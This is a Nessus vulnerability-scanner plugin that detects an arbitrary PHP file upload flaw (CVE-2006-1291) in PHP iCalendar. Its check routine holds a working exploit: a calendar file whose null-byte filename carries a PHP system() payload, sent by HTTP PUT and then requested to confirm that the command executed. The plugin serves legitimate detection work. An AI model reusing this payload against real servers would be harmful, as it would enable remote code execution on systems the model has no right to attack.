#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(21091);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-1291");
  script_bugtraq_id(17129);
  script_osvdb_id(24031);

  script_name(english:"PHP iCalendar publish.ical.php Arbitrary File Upload");
  script_summary(english:"Tries to upload PHP code using PHP iCalendar");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The installed version of PHP iCalendar supports iCal publishing but
does not properly restrict the types of files uploaded and places them
in a web-accessible directory.  An unauthenticated attacker can
leverage this issue to upload files with arbitrary PHP code and then
run that code subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that
'$phpicalendar_publishing' be enabled in 'config.inc.php', which is
not the default." );
  # http://downloads.securityfocus.com/vulnerabilities/exploits/php-iCalendar-221.upload.php
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1e9e4806" );
 script_set_attribute(attribute:"solution", value:
"Edit the application's 'config.inc.php' file and set
'$phpicalendar_publishing' to 0." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/15");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:php_icalendar:php_icalendar");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Exploit data.
cmd = "id";
file = string(SCRIPT_NAME, "-", unixtime(), ".php");
ics = raw_string(
  "X-WR-CALNAME: ", file, 0x00, rand_str(), "\r\n",
  "\r\n",
  "<?php system(", cmd, "); ?>"
);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Upload the exploit.
  r = http_send_recv3(method: "PUT", port: port,
    item: dir + "/calendars/publish.ical.php", 
    data: ics);

  # nb: the PHP script won't return anything.

  # Check whether the exploit worked.
  r = http_send_recv3(method:"GET", item:string(dir, "/calendars/", file), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem the output looks like it's from id.
  res = strstr(res, "uid=");
  if (res && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    report = string(
      "\n",
      "Nessus was able to execute the command 'id' on the remote host;\n",
      "the output was:\n",
      "\n",
      res
    );

    security_hole(port:port, extra:report);
    exit(0);
  }
}
